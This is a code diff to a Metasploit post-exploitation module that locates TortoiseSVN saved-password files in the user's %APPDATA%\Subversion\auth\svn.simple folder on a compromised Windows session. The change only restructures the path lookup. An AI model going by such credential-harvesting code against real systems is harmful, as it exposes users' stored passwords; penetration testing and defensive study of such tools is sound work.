@@ -103,7 +103,8 @@ class Metasploit3 < Msf::Post
   def get_config_files
     # Determine if TortoiseSVN is installed and parse config files
     savedpwds = 0
-    path = session.fs.file.expand_path("%APPDATA%\\Subversion\\auth\\svn.simple\\")
+    user_appdata = session.fs.file.expand_path("%APPDATA%")
+    path = user_appdata + '\\Subversion\\auth\\svn.simple\\'
     print_status("Checking for configuration files in: #{path}")
 
     begin
